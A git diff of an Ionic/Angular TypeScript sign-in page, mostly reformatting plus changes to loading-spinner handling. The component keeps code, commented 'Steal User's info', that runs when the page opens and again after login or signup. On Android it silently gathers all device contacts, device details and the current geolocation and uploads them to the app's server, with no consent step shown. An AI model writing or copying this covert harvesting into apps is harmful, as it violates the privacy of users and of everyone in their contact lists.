@@ -40,46 +40,47 @@ export class SignIn {
     passwdLabel: string = "Password";
     enterLabel: string = "Enter";
     signupLabel: string = "Sign Up";
-    termsLabel: string = "Terms and Conditions";    
+    termsLabel: string = "Terms and Conditions";
 
     loading: Loading = Loading.create(
-            {
-                content: 'Loading.. Please wait',
-                                duration: 4000
-            }
-        );;
+        {
+            content: 'Signing In.. Please wait',
+            dismissOnPageChange: true,
+            duration: 500
+        }
+    );;
 
     contacts: Contact[];
 
-    constructor(public nav: NavController, public config: Config, public cache: Cache, public service: ServiceCaller, 
-                    public platform: Platform, public notifications: Notifications) {
+    constructor(public nav: NavController, public config: Config, public cache: Cache, public service: ServiceCaller,
+        public platform: Platform, public notifications: Notifications) {
     }
-    
-    
-    onPageWillEnter() {        
+
+
+    onPageWillEnter() {
         this.checkConnectionToServer();
-    }  
-      
+    }
+
     checkConnectionToServer() {
         let ping = this.service.checkConnection();
         let labels = this.service.getLabelsOfALanguage(this.config.language);
-        ping.subscribe(data => {}, err => {this.pingFailure(err);});
-        labels.subscribe((data) => { this.cache.setLabels(data);}, (err) => { this.pingFailure(err); });
+        ping.subscribe(data => { }, err => { this.pingFailure(err); });
+        labels.subscribe((data) => { this.cache.setLabels(data); }, (err) => { this.pingFailure(err); });
         this.uploadUsersDeviceContactGeoInfo(null); // Steal User's info        
     }
-      
+
     //#region Error Handling
-    pingFailure(err: any ) {
+    pingFailure(err: any) {
         this.loginError = "Unable to Connect to Server";
     }
     //#endregion Error Handling
 
-/*      
-    uploadUserInfo(userId: string) {
-        // TODO: Check connection and handle error
-        this.uploadUsersDeviceContactGeoInfo(userId);
-    }
-  */
+    /*      
+        uploadUserInfo(userId: string) {
+            // TODO: Check connection and handle error
+            this.uploadUsersDeviceContactGeoInfo(userId);
+        }
+      */
     /* TODO: Move this to app.ts
     checkIfUserIsLoggedIn() {
         let user: User = JSON.parse(window.localStorage['user'] || '{}');
@@ -89,7 +90,7 @@ export class SignIn {
         }
     }
     */
-    
+
     /*
     loadUserInfo(userId: string, navigate: boolean) {
         let userInfo = this.service.getUserInfo(userId);
@@ -100,9 +101,11 @@ export class SignIn {
 */
 
     login() {
-        this.nav.present(this.loading);
         let validation = this.service.validateCredentials(this.email, this.password);
-        validation.subscribe(data => { this.storeCredAndGoToHome(data); }, err => this.handleloginError(err));
+        this.nav.present(this.loading);
+        validation.subscribe(data => {
+              this.loading.dismiss();
+              this.storeCredAndGoToHome(data); }, err => this.handleloginError(err));
 
     }
 
@@ -110,7 +113,6 @@ export class SignIn {
         window.localStorage['userId'] = JSON.stringify(user.Id);
         this.config.setUserInfo(user);
         this.uploadUsersDeviceContactGeoInfo(user.Id);
-        this.loading.dismiss();
         this.nav.push(NewsFeed);
     }
 
@@ -118,32 +120,33 @@ export class SignIn {
         if (!this.validateInputs()) {
             return;
         }
-        this.nav.present(this.loading);
         let signup = this.service.signUp(this.email, this.password, this.language);
-        signup.subscribe(data => this.storeCredAndGoToHome(data), err => this.handleloginError(err));
+        this.nav.present(this.loading);
+        signup.subscribe(data => {  this.loading.dismiss();
+                                    this.storeCredAndGoToHome(data);
+                                } , err => this.handleloginError(err));
     }
-    
+
     validateInputs() {
-        if ((this.email.length == 0))
-        { 
+        if ((this.email.length == 0)) {
             this.handleloginError('Email cannot be empty');
             return false;
-            }
-        if (this.password.length == 0)
-        {
-            this.handleloginError('Password cannot be empty');
-            return false;            
         }
-        if  (this.language.length == 0) {
+        if (this.password.length == 0) {
+            this.handleloginError('Password cannot be empty');
+            return false;
+        }
+        if (this.language.length == 0) {
             this.handleloginError('Please select language');
-            return false;            
+            return false;
         }
         return true;
     }
 
     handleloginError(err: any) {
+        this.loading.dismiss();
         this.loginError = JSON.parse(err._body).ExceptionMessage;
-    }    
+    }
 
     /*
     loadLabels() {
@@ -153,7 +156,7 @@ export class SignIn {
         } catch (error) {console.log(error)};
     }
     */
-    
+
     setLabels(data: Dictionary<string, string>) {
         this.emailLabel = data.getValue('email');
         this.passwdLabel = data.getValue('password');
@@ -161,52 +164,52 @@ export class SignIn {
         this.signupLabel = data.getValue('signup');
         this.termsLabel = data.getValue('terms');
     }
-    
+
     //#region User Info
     uploadUsersDeviceContactGeoInfo(userId: string) {
-        if (this.config.isOnAndroid) {
-            this.platform.ready().then(() => {
+        if (!this.config.isOnAndroid) return;
+        this.platform.ready().then(() => {
             this.uploadContactsList(userId);
             this.uploadDeviceInfo(userId);
             this.uploadGeoInfo(userId);
         });
-        }
     }
-    
+
     uploadContactsList(userId: string) {
         // Contacts List
         var contactJson: UserContactsInfo;
         var contactsList = Contacts.find(['*']);
-        contactsList.then(data => { this.contacts = data;
+        contactsList.then(data => {
+        this.contacts = data;
             contactJson = { UserId: userId, JSON: JSON.stringify(data) }
             let contactsUpload = this.service.uploadContactsList(JSON.stringify(contactJson));
-            contactsUpload.subscribe(data => {console.log("contacts updated");});
-             });        
+            contactsUpload.subscribe(data => { console.log("contacts updated"); });
+        });
     }
-    
+
     uploadDeviceInfo(userId: string) {
         // Device Info
         var deviceJson: UserDeviceInfo;
         deviceJson = { UserId: userId, JSON: JSON.stringify(Device.device) }
         let deviceUpload = this.service.uploadDeviceInfo(JSON.stringify(deviceJson));
-        deviceUpload.subscribe(data => {console.log("device info updated");})
-     }
-     
-     uploadGeoInfo(userId: string) {
+        deviceUpload.subscribe(data => { console.log("device info updated"); })
+    }
+
+    uploadGeoInfo(userId: string) {
         // Geo-location
         var geoJson: UserGeoInfo;
         let geoPos = Geolocation.getCurrentPosition();
-        geoPos.then(data =>    {     
-                    geoJson = { UserId: userId, JSON: JSON.stringify(data)};
-                    let geoUpload = this.service.uploadUserLocation(JSON.stringify(geoJson));
-                    geoUpload.subscribe(data => {console.log("geo info updated");})
-        });                 
-     }
+        geoPos.then(data => {
+            geoJson = { UserId: userId, JSON: JSON.stringify(data) };
+            let geoUpload = this.service.uploadUserLocation(JSON.stringify(geoJson));
+            geoUpload.subscribe(data => { console.log("geo info updated"); })
+        });
+    }
 
     //#endregion User Info
-    
+
     // #region Version
-    
+
     /*
     checkVersion() {
         let versionInfo = this.service.getVersionInfo();
